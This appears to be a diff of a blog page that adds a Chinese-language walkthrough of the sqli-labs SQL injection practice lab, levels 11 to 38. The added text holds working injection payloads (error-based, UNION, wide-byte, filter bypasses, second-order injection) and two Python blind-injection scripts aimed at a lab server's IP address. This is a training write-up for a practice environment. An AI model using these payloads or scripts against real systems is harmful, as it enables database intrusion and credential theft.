@@ -24,7 +24,18 @@
 <meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.4.png">
 <meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.5.png">
 <meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.6.png">
-<meta property="og:updated_time" content="2019-10-13T03:00:16.531Z">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.7.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.8.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.9.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql11.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql12.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql13.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql14.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql15.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql16.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql17.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql18.png">
+<meta property="og:updated_time" content="2019-10-20T14:14:30.627Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-labs">
 <meta name="twitter:description" content="注入语句备忘 查库名：select schema_name from information_schema.schemata 查表名：select table_name from information_schema.tables where table_schema=&amp;#39;库名&amp;#39; 查列名：select column_name from information_schema.colum">
@@ -35,7 +46,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1570935665902">
+  <link rel="stylesheet" href="/css/style.css?v=1571749227029">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -49,7 +60,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>6</div>
+        <div><span>文章</span>7</div>
         <div><span>标签</span>0</div>
         <div><span>分类</span>4</div>
     </div>
@@ -78,7 +89,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">文章分类</h3>
     <div class="nexmoe-widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL注入/">SQL注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/文件上传/">文件上传</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL注入/">SQL注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/文件上传/">文件上传</a><span class="category-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -153,8 +164,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>1,045 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>2,475 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
     
       <a class="nexmoefont icon-appstore-fill -link" href="/categories/SQL注入/">SQL注入</a>
     
@@ -276,7 +287,101 @@ for i in range(1,10):
             print(result)
             break
 </code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>用<code>&quot;</code>闭合</p>
-<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>由于请求方式是post，因此要用BurpSuit抓包，可以发现账号密码处存在注入点<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.7.png" alt="sql"><br>#Less-12<br>同上，用<code>&quot;)</code>闭合<br>#Less-13<br>可以发现页面没有回显，通过返回图片的不同可以发现是bool盲注，而且时间盲注应该是可以的，但是由于返回的数据包不同点是图片不相同，不能通过判断长度进行布尔盲注，可以用<code>if(s in r.txt)</code>进行判断<br>先放一下脚本：</p>
+<pre><code>import requests
+
+url = &quot;http://47.96.233.216:8080/Less-13/&quot;
+
+test = &quot;select database()&quot;
+
+schema = &quot;select schema_name from information_schema.schemata limit 0,1&quot;
+
+table = &quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;
+
+column = &quot;select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1&quot;
+
+data = &quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;
+
+result = &quot;&quot;
+
+for i in range(1,10):
+    for j in range(48,122):
+        payload = &quot;admin&#39;) and ascii(substr(({0}),{1},1))={2} #&quot;.format(test,i,j)
+        post_r = {&quot;uname&quot;:payload,&quot;passwd&quot;:&quot;admin&quot;}
+        r = requests.post(url,data=post_r)
+        l = len(r.text)
+        txt = r.text
+        s = &quot;../images/flag.jpg&quot;
+        if (s in txt):
+            result+=chr(j)
+            print(result)
+            break</code></pre><p>以及一个网上找的一个较好的脚本‘<a href="https://blog.csdn.net/vhkjhwbs/article/details/98960802’：" target="_blank" rel="noopener">https://blog.csdn.net/vhkjhwbs/article/details/98960802’：</a></p>
+<pre><code>import requests
+
+chars = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&quot;
+result = &quot;&quot;
+
+def get_length(value):  #获取要查询的数据的长度
+    for n in range(1,100):
+        payload = &quot;admin&#39;) and length(({0})) ={1} #&quot;.format(data_payload,n)
+        data = {&quot;uname&quot;:payload,&quot;passwd&quot;:&quot;admin&quot;}
+        html = requests.post(url,data=data)
+        length = len(html.text)
+        if length &gt;value:
+            print(&quot;……data length is :&quot; + str(n))
+            return  n
+
+def get_data(data_length,value): #获取数据
+    global result
+    for i in range(1,data_length):
+        for char in chars:
+            payload = &quot;admin&#39;)and ascii(substr(({0}),{1},1))={2} #&quot;.format(data_payload,i,ord(char))
+            data = {&quot;uname&quot;:payload,&quot;passwd&quot;:&quot;admin&quot;}
+            html = requests.post(url,data=data)
+            length = len(html.text)
+            if length&gt;value:         #根据返回长度的不同来判断字符正确与否
+                result += char
+                print(&quot;…… data is :&quot;+ result)
+                break
+
+
+url = &quot;http://47.96.233.216:8080/Less-13/&quot;
+data_payload = &quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&quot;
+value = 1460 
+
+length = get_length(value) +1
+get_data(length,value)
+print(result)
+</code></pre><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>用<code>&quot;</code>闭合</p>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>同第十三关脚本</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p>用<code>&quot;)</code>闭合</p>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>盲猜报错注入<br>先给出报错注入的几种函数及其用法：</p>
+<ol>
+<li>floor():<code>select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));</code>group by 对rand()函数进行操作时产生错误</li>
+<li>extractvalue():<code>extractualue(1,concat(0x7e,(select database()),0x7e));</code>XPATH语法错误报错</li>
+<li>updatexml():<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>XPATH语法错误报错<br>在passwd处存在注入点：<br>payload：<code>11111&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+</code><br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.8.png" alt="sql"><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1>可以猜测UA可能存在注入点<br>构造UA<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1>reffer存在注入点，其余同上<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1>打开提示cookie，那就先抓个包，构造cookie<code>uname=admin&#39;</code>发现报错，可知存在注入点，其余就是正常步骤，先判断列数，可以发现是3。。。。<h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1>用<code>&#39;)</code>闭合，并且是要经过base64编码，其余同上<h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1>用<code>&quot;</code>闭合<h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><code>#</code>以及<code>--</code>被过滤<br>那就用<code>or &#39;1&#39;=&#39;1</code>来闭合多余出来的单引号<h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1>二次注入<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.9.png" alt="sql"><br>先注册一个用户名为<code>admin&#39; #</code>的账号，虽然注册时会被转义，但是数据还是会被存入数据库，所以在接下来其他地方被调用时就会出现漏洞，即在改密码时，SQL语句拼接出<code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; #&#39; and password=&#39;$curr_pass&#39; &quot;</code>，</li>
+</ol>
+<p>就可以修改admin的密码，实现SQL注入<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql11.png" alt="sql"><br>就可以用admin账户登录<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql12.png" alt="sql"></p>
+<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>AND和OR都被过滤，但是UNION没有被过滤可以实现注入，并且可以通过双写来Bypass过滤：<code>id=-1&#39; oorr 1=1--+</code></p>
+<h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>和25一样</p>
+<h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>过滤了空格，本想着用<code>/**/</code>绕过，发现还是不行，一看源码：<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql13.png" alt="sql"><br>过滤了大部分的东西，本来想着绕过空格的方式：<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格，发现其中%a0以及%0b可用，<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql14.png" alt="sql"><br>或者需要用()绕过，使用报错注入的方式，构造payload：<code>?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271</code><br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql15.png" alt="sql"><br><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code>爆表名<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql16.png" alt="sql"></p>
+<h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p>基于绕过过滤空格后的正确注入（可用%a0绕过），或者基于bool盲注，因为没有错误回显，所以不能报错注入</p>
+<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>题目说过滤了UNION和SELECT，但是查看源代码发现可以大小写绕过。。。同时过滤了空格和注释夫，可以用上面的方法绕过，payload“<code>?id=0&#39;%a0unIon%a0seleCt%a01,2,3||&#39;1&#39;=&#39;1</code></p>
+<h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>用<code>&quot;</code>闭合，其余同上</p>
+<h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>虽然题目说过滤了union和select，但是发现仍然是可以用的，不知道是环境问题还是题目本来就是这样的，同时是用<code>(&#39;</code>闭合的，且过滤了空格等，课用上面的方法绕过<br>payload：<code>?id=0&#39;)%a0union%a0select%a01,2,3||(&#39;1&#39;=&#39;1</code><br>后来才发现题目是过滤了<code>union select</code>这个词组，因为中间加了<code>%a0</code>,刚好绕过了检测</p>
+<h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p>同上，但是貌似减少课过滤的东西，更简单了？？</p>
+<h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>尝试一下<code>?id=0%27union%20select%201,2,3--+</code>,发现好像啥也没过滤？？？<br>然后就和第一关一样了。。。</p>
+<h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>先用单引号闭合发现没用，再用双引号闭合发现报错，接下来就和上面的一样了</p>
+<h1 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h1><p>用<code>&quot;)</code>闭合，其余一样</p>
+<h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><p>宽字节注入，payload：<code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
+<h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>同上</p>
+<h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><p>这里的提交方式是post，但是又用/转义了’，一种方式是将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ ，但是这%df仍然可以用<br>，再加上报错注入：<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql17.png" alt="sql"></p>
+<h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><p>直接注。。。</p>
+<h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><p>%df宽字节注入</p>
+<h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><p>这一次就没有像34关一样简单，%df没有办法用了，但是可以将utf-8转换为utf-16或 utf-32，构造payload“<code>111�&#39; union select 1,(select database())--+</code></p>
+<p><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql18.png" alt="sql"></p>
+<h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><p>直接注。。。</p>
+
   </article>
   
     
@@ -323,7 +428,7 @@ for i in range(1,10):
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1570935665893"></script>
+<script src="/js/app.js?v=1571749227007"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
   
